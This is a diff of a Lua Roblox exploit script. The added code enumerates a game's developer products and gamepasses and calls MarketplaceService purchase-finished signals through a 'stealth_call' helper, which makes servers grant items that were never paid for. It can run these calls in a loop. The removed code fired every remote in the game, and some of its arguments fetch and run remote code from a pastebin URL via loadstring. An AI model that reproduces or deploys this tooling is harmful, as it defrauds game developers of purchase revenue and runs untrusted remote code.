@@ -166,109 +166,163 @@ task.spawn(function()
     end)
 end)
 
-local remotes = serv:Channel("Remotes")
-remotes:Label("\nFires all remotes in the game as an attempt to prompt the item.\nWarning: This can be risky and can fire a decoy remote!\n")
-remotes:Textbox("UGC Limited Item ID", "Enter Item ID that you wanna be included in the arguments...", false,
-    function(t)
-        local tt = tonumber(t)
-        if type(tt) == "number" then
-            getgenv().limitedidforfiringremotewithwyvern = tt
-            discord:Notification("Success",
-                "The script now remembers that the Item ID you want is " .. tostring(tt) .. "!", "Okay!")
+local purchase = serv:Channel("Purchase Exploits")
+    local x_x = HttpService:JSONDecode(game:HttpGet(
+        "https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" .. game.GameId .. "&page=1"))
+    local dnames = {}
+    local dproductIds = {}
+    if type(x_x.DeveloperProducts) == "nil" then
+        table.insert(dnames, " ")
+    end
+
+    pcall(function()
+
+        local currentPage = 1
+
+        repeat
+            local response = game:HttpGet(
+                "https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" ..
+                    tostring(game.GameId) .. "&page=" .. tostring(currentPage))
+            local decodedResponse = HttpService:JSONDecode(response)
+            local developerProducts = decodedResponse.DeveloperProducts
+            print("Page " .. currentPage .. ":")
+            for _, developerProduct in pairs(developerProducts) do
+                table.insert(dnames, developerProduct.Name)
+                table.insert(dproductIds, developerProduct.ProductId)
+            end
+            currentPage = currentPage + 1
+            local final = decodedResponse.FinalPage
+        until final
+
+    end)
+    purchase:Label("Fake Purchaser!\nThis tricks server that you bought a DevProduct!")
+    purchase:Label("Only works in some games...")
+    purchase:Label("Loop starts when the button to fire is pressed")
+    purchase:Toggle("Loop Purchases (Rejoin To Stop)", false, function(bool)
+        if bool then
+            getgenv().wyvernlooppurchases = true
         else
-            discord:Notification("Error", "That's... not an Item ID.", "Okay!")
+            getgenv().wyvernlooppurchases = false
+            local killswitch = Instance.new("Script")
+            killswitch.Parent = Visit
         end
     end)
-remotes:Dropdown("Remote Arguments...",
-    {"No Arguments/Blank", "LocalPlayer", "Your Username", "UGC Item ID", "UGC Item ID, LocalPlayer",
-     "LocalPlayer, UGC Item ID", "'UGC' as a string", "UGC Item ID, 'true' boolean", "'true' boolean",
-     "literal lua code to prompt item", "loadstring prompt item"}, function(x)
-        if not getgenv().limitedidforfiringremotewithwyvern then
-            discord:Notification("Error",
-                "You must put a Limited Item ID at the first textbox before firing... Or just set it to blank if you're using this not for the purpose of UGC hunting.",
-                "Okay!")
-        else
-            local id = getgenv().limitedidforfiringremotewithwyvern
-            local fire = function(args)
-                local count = 0
-                for i, v in pairs(game:GetDescendants()) do
-                    if v:IsA("RemoteEvent") or v:IsA("UnreliableRemoteEvent") then
-                        count = count + 1
-                        task.spawn(function()
-                            v:FireServer(unpack(args))
-                        end)
-                    end
-                end
-                discord:Notification("Remote Fired", "Fired " .. tostring(count) .. " remotes with arguments: " .. tostring(table.concat(args, ", ")), "Okay!")
-            end
-            if x == "No Arguments/Blank" then
-                fire({})
-            elseif x == "LocalPlayer" then
-                fire({Players.LocalPlayer})
-            elseif x == "Your Username" then
-                fire({Players.LocalPlayer.Name})
-            elseif x == "UGC Item ID" then
-                fire({id})
-            elseif x == "UGC Item ID, LocalPlayer" then
-                fire({id, Players.LocalPlayer})
-            elseif x == "LocalPlayer, UGC Item ID" then
-                fire({Players.LocalPlayer, id})
-            elseif x == "'UGC' as a string" then
-                fire({"UGC"})
-            elseif x == "UGC Item ID, 'true' boolean" then
-                fire({id, true})
-            elseif x == "'true' boolean" then
-                fire({true})
-            elseif x == "literal lua code to prompt item" then
-                fire({"loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))()"})
-            elseif x == "loadstring prompt item" then
-                fire({loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))})
+    local index
+    purchase:Dropdown("Below is a list of all DevProducts in this game!", dnames, function(x)
+        index = nil
+        for i, name in ipairs(dnames) do
+            if name == x then
+                index = i
+                break
             end
         end
     end)
 
-local purchase = serv:Channel("Purchase Exploit")
-purchase:Label("\nThis tool helps you bypass the regular purchase prompts for items in the game.\n")
-purchase:Textbox("Item ID", "Enter the ID of the item you want to purchase...", false,
-    function(itemId)
-        local id = tonumber(itemId)
-        if type(id) == "number" then
-            getgenv().itemidforpurchase = id
-            discord:Notification("Success", "The script now remembers that the Item ID you want to purchase is " .. tostring(id) .. "!", "Okay!")
+    purchase:Label("If nothing shows above, no DevProducts found.")
+    purchase:Button("Fire Selected Dev Product!", function()
+        if index then
+            local product = dproductIds[index]
+            pcall(function()
+                stealth_call(
+                    'if getgenv().wyvernlooppurchases then while task.wait() do if Visit:FindFirstChild("Script") then break end MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' ..
+                        product ..
+                        ', true) end else MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' ..
+                        product .. ', true) end')
+            end)
+            task.wait(0.2)
+            if not Visit:FindFirstChild("LocalScript") then
+                discord:Notification("Error", "Your executor blocked function SignalPromptProductPurchaseFinished.",
+                    "Okay!")
+                Visit:FindFirstChild("LocalScript"):Destroy()
+            end
         else
-            discord:Notification("Error", "That's... not a valid Item ID.", "Okay!")
+            discord:Notification("Error", "Something went wrong but I don't know what.", "Okay!")
         end
     end)
-purchase:Dropdown("Purchase Method",
-    {"Standard Purchase", "Bypass Prompt", "Direct Purchase", "Custom Purchase Script"},
-    function(method)
-        if not getgenv().itemidforpurchase then
-            discord:Notification("Error", "You must put an Item ID in the textbox before attempting to purchase.", "Okay!")
-        else
-            local id = getgenv().itemidforpurchase
-            if method == "Standard Purchase" then
-                game:GetService("MarketplaceService"):PromptPurchase(Players.LocalPlayer, id)
-                discord:Notification("Purchase Attempt", "Attempted to purchase item with ID: " .. tostring(id), "Okay!")
-            elseif method == "Bypass Prompt" then
-                game:GetService("MarketplaceService"):PromptPurchase(Players.LocalPlayer, id, true)
-                discord:Notification("Purchase Attempt", "Attempted to bypass prompt and purchase item with ID: " .. tostring(id), "Okay!")
-            elseif method == "Direct Purchase" then
-                local success, err = pcall(function()
-                    game:GetService("MarketplaceService"):PromptPurchaseFinished(Players.LocalPlayer, id, Enum.PurchaseResult.Purchased)
+    purchase:Button("Fire All Dev Products", function()
+        getrenv()._set = clonefunction(setthreadidentity)
+        local starttickcc = tick()
+        for i, product in pairs(dproductIds) do
+            task.spawn(function()
+                pcall(function()
+                    stealth_call(
+                        'if getgenv().wyvernlooppurchases then while task.wait() do if Visit:FindFirstChild("Script") then break end MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' ..
+                            product ..
+                            ', true) end else MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, ' ..
+                            product .. ', true) end')
                 end)
-                if success then
-                    discord:Notification("Purchase Success", "Successfully bypassed prompt and purchased item with ID: " .. tostring(id), "Okay!")
-                else
-                    discord:Notification("Purchase Failed", "Failed to purchase item with ID: " .. tostring(id) .. ". Error: " .. tostring(err), "Okay!")
-                end
-            elseif method == "Custom Purchase Script" then
-                -- Here you can put your custom purchase script
-                local customScript = [[
-                -- Example custom purchase script
-                game:GetService("MarketplaceService"):PromptPurchase(Players.LocalPlayer, ]] .. tostring(id) .. [[)
-                ]]
-                loadstring(customScript)()
-                discord:Notification("Custom Purchase Script Executed", "Attempted to execute custom purchase script for item with ID: " .. tostring(id), "Okay!")
+            end)
+            task.wait()
+        end
+        local endtickcc = tick()
+        local durationxd = endtickcc - starttickcc
+    end)
+    purchase:Seperator()
+    purchase:Label("Pretty much the same as the one above but for gamepass")
+    local wyverngamepass = game.HttpService:JSONDecode(game:HttpGet(
+        "https://games.roblox.com/v1/games/" .. game.GameId .. "/game-passes?limit=100&sortOrder=1"))
+    local gnames = {}
+    local gproductIds = {}
+    for i, v in pairs(wyverngamepass.data) do
+        table.insert(gnames, v.name)
+        table.insert(gproductIds, v.id)
+    end
+    local gamepass
+    purchase:Dropdown("Below is a list of all GamePass in this game!", gnames, function(x)
+        for i, name in ipairs(gnames) do
+            if name == x then
+                gamepass = gproductIds[i]
+                break
             end
         end
+
     end)
+    purchase:Label("If nothing shows above, no GamePass found.")
+    purchase:Button("Fire Selected Gamepass", function()
+        if gamepass then
+            pcall(function()
+                stealth_call('MarketplaceService:SignalPromptGamePassPurchaseFinished(game.Players.LocalPlayer, ' ..
+                                 tostring(gamepass) .. ', true)')
+            end)
+            task.wait(0.2)
+            if not Visit:FindFirstChild("LocalScript") then
+                discord:Notification("Error", "Your executor blocked function SignalPromptGamePassPurchaseFinished.",
+                    "Okay!")
+            else
+                discord:Notification("Success",
+                    "Fired PromptProductGamePassPurchaseFinished signal to server with productId: " ..
+                        tostring(gamepass), "Okay!")
+                Visit:FindFirstChild("LocalScript"):Destroy()
+            end
+        else
+            discord:Notification("Error", "Something went wrong but I don't know what.", "Okay!")
+        end
+    end)
+    purchase:Seperator()
+    purchase:Label("Signals to server that an item purchase failed.")
+    purchase:Label("This can trick servers to reprompt an item!")
+    local returnvalprompt = false
+    purchase:Toggle("Item Purchase Success Return Value", returnvalprompt, function(bool)
+        returnvalprompt = bool
+    end)
+    purchase:Textbox("Item ID of the UGC item", "Enter the Item ID...", false, function(t)
+        local tt = tonumber(t)
+        if type(tt) == "number" then
+            pcall(function()
+                stealth_call('MarketplaceService:SignalPromptPurchaseFinished(game.Players.LocalPlayer, ' .. tt ..
+                                 ', false) MarketplaceService:SignalPromptPurchaseFinished(game.Players.LocalPlayer, ' ..
+                                 tt .. ', ' .. tostring(returnvalprompt) ')')
+            end)
+            task.wait(0.2)
+            if not Visit:FindFirstChild("LocalScript") then
+                discord:Notification("Error", "Your executor blocked function SignalPromptPurchaseFinished.", "Okay!")
+            else
+                discord:Notification("Success",
+                    "Fired signal PromptPurchaseFinished with bool false and productId: " .. tostring(tt), "Okay!")
+                Visit:FindFirstChild("LocalScript"):Destroy()
+            end
+        else
+            discord:Notification("Error", "That's... Not an Item ID.", "Okay!")
+        end
+    end)
+end)
